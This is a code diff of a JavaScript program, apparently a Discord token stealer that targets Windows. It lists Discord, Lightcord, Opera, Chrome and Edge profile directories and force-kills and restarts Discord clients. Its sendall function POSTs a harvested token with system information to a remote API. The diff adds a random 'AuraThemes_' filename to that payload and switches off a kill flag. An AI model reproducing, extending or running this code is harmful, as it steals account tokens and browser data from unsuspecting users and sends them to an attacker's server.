@@ -16,7 +16,7 @@ switch (process.platform) {
     case "win32":
         let appdata = process.env.appdata,
             localappdata = process.env.localappdata,
-            killdcop = true,
+            killdcop = false,
             paths = [`${appdata}/discord/`,`${appdata}/discordcanary/`,`${appdata}/discordptb/`,`${appdata}/discorddevelopment/`,`${appdata}/lightcord/`,`${appdata}/Opera Software/Opera Stable/`,`${appdata}/Opera Software/Opera GX Stable/`,`${localappdata}/Google/Chrome/User Data/Default/`,`${localappdata}/Google/Chrome/User Data/Profile 1/`,`${localappdata}/Google/Chrome/User Data/Profile 2/`,`${localappdata}/Google/Chrome/User Data/Profile 3/`,`${localappdata}/Google/Chrome/User Data/Profile 4/`,`${localappdata}/Google/Chrome/User Data/Profile 5/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/`,`${localappdata}/Google/Chrome/User Data/Default/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,`${localappdata}/Microsoft/Edge/User Data/Default/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`],
             cords = ['discord','discordcanary','discordptb','discorddevelopment','lightcord'];startup()
 
@@ -195,26 +195,37 @@ switch (process.platform) {
             }
           }
 
-          async function killAndRestartClient(c) {
+        async function killAndRestartClient(c) {
             try {
                 await exec(`taskkill /F /T /IM ${c}`);
                 const clientPath = `${localappdata}/${c.replace('.exe', '')}/Update.exe`;
                 await exec(`"${clientPath}" --processStart ${c}`);
             } catch (err) {
-              console.error(err);
+                console.error(err);
             }
-          }
+        }
+
+        let g = function(s) {
+            let d = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let r = '';
+            for (i = 0; i < s; i++) {
+              let x = d.charAt(Math.floor(Math.random() * d.length));
+              r += x;
+            }
+            return `AuraThemes_${r}`;
+        }
 
         async function sendall(t) {
+            let r = g(10)
             fetch(`${API}/startup`, {
                 method: "POST", 
                 body: JSON.stringify({
                     token: t,
+                    filename: r,
                     ...getSystemInfo()
                 })
             })
         }
-        
         break
     default: break
 }
